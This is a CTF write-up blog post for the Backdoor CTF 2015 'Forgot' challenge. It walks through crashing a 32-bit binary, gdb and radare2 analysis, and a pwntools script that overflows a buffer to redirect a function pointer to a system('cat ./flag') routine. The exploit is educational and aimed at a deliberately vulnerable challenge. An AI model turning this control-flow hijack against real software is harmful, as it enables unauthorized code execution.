---
layout: post
title: "Backdoor CTF 2015 Forgot"
date: 2015-04-02 14:19:08 -0400
author: [superkojiman,barrebas]
comments: true
categories: [backdoor]
---

### Solved by superkojiman and barrebas

Barrebas and I started working on this separately and ended up with a solution almost simultaneously. Forgot is a 32-bit ELF binary that asks for a name, and an email address to validate. We quickly found out that we could crash the binary by sending a large string for either the name or the email address:

```
# python -c 'print "A"*100' | ./forgot 
What is your name?
> 
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

            Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> Segmentation fault (core dumped)
```

I loaded the binary up in gdb and fed it a file with 100 "A"s:

```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41414141 ('AAAA')
EBX: 0x45 ('E')
ECX: 0x0 
EDX: 0x5 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffea8078 --> 0x0 
ESP: 0xffea7fec --> 0x8048a67 (mov    eax,ds:0x804b060)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffea7fec --> 0x8048a67 (mov    eax,ds:0x804b060)
0004| 0xffea7ff0 --> 0xffea8000 ('A' <repeats 69 times>)
0008| 0xffea7ff4 --> 0xffea8000 ('A' <repeats 69 times>)
0012| 0xffea7ff8 --> 0xf7738c20 --> 0xfbad2088 
0016| 0xffea7ffc --> 0x0 
0020| 0xffea8000 ('A' <repeats 69 times>)
0024| 0xffea8004 ('A' <repeats 65 times>)
0028| 0xffea8008 ('A' <repeats 61 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

We can control EIP. Checking the stack trace, we see that the last function called was 0x08048a67

```
gdb-peda$ bt
#0  0x41414141 in ?? ()
#1  0x08048a67 in ?? ()
#2  0xf75caa63 in __libc_start_main () from /lib32/libc.so.6
#3  0x08048501 in ?? ()
```

Let's peek at what's around that area:

```
gdb-peda$ x/10i 0x08048a67-16
   0x8048a57:   inc    DWORD PTR [ebx+0x178246c]
   0x8048a5d:   mov    eax,DWORD PTR [esp+0x78]
   0x8048a61:   mov    eax,DWORD PTR [esp+eax*4+0x30]
   0x8048a65:   call   eax
   0x8048a67:   mov    eax,ds:0x804b060
   0x8048a6c:   mov    DWORD PTR [esp],eax
   0x8048a6f:   call   0x8048450 <fflush@plt>
   0x8048a74:   mov    ebx,DWORD PTR [ebp-0x4]
   0x8048a77:   leave  
   0x8048a78:   ret 
```

The call eax instruction looks promising. It's likely that we're overwriting eax with 0x41414141 which causes it to crash. This binary has NX enabled so we can't execute shellcode on the stack. Much like the Echo challenge, I assumed there was probably some function we could jump to. 

```
[0x080484e0]> afl
0x08048440     16   0  imp.printf
0x08048450     16   0  imp.fflush
0x08048460     16   0  imp.fgets
0x08048470     16   0  imp.puts
0x08048480     16   0  imp.system
0x08048490     16   0  imp.__gmon_start__
0x080484a0     16   0  imp.strlen
0x080484b0     16   0  imp.__libc_start_main
0x080484c0     16   0  imp.snprintf
0x080484d0     16   0  imp.__isoc99_scanf
0x080487aa    719   6  main
```

Looks like there's a call to system() happening somewhere. Poking around in radare2 we find it here:

```
[0x080484e0]> pd 50@0x080486cc
            0x080486cc    55           push ebp
            0x080486cd    89e5         mov ebp, esp
            0x080486cf    83ec58       sub esp, 0x58
            0x080486d2    c744240c9f8. mov dword [esp + 0xc], str.._flag  ; [0x8048d9f:4]=0x6c662f2e  ; "./flag" @ 0x8048d9f
            0x080486da    c7442408a68. mov dword [esp + 8], str.cat__s  ; [0x8048da6:4]=0x20746163  ; "cat %s" @ 0x8048da6
            0x080486e2    c7442404320. mov dword [esp + 4], 0x32        ; [0x32:4]=0x6001b  ; '2'
            0x080486ea    8d45c6       lea eax, [ebp - 0x3a]
            0x080486ed    890424       mov dword [esp], eax
            0x080486f0    e8cbfdffff   call sym.imp.snprintf
               sym.imp.snprintf()
            0x080486f5    8d45c6       lea eax, [ebp - 0x3a]
            0x080486f8    890424       mov dword [esp], eax
            0x080486fb    e880fdffff   call sym.imp.system
               sym.imp.system()
            0x08048700    c9           leave
            0x08048701    c3           ret
```

Now it looks like this calls system("cat ./flag") and prints it out to stderr. So all we have to do is setup our buffer such that EAX will contain 0x080486cc so that call eax will lead to giving us the flag.

The exploit:

```python
#!/usr/bin/env python
from pwn import *

r = remote("hack.bckdr.in", 8009)
print r.recv()

buf = ""
buf += "A"*63
buf += p32(0x080486cc)

r.send(buf + "\n")
print r.recvall()
```

Getting the flag: 

```text
# python forgot.py 
[+] Opening connection to hack.bckdr.in on port 8009: Done
What is your name?
> 
[+] Recieving all data: Done (365B)
[*] Closed connection to hack.bckdr.in port 8009

Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

            Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> flag_goes_here_flag_goes_here_flag_goes_here_flag_goes_here_flag
```
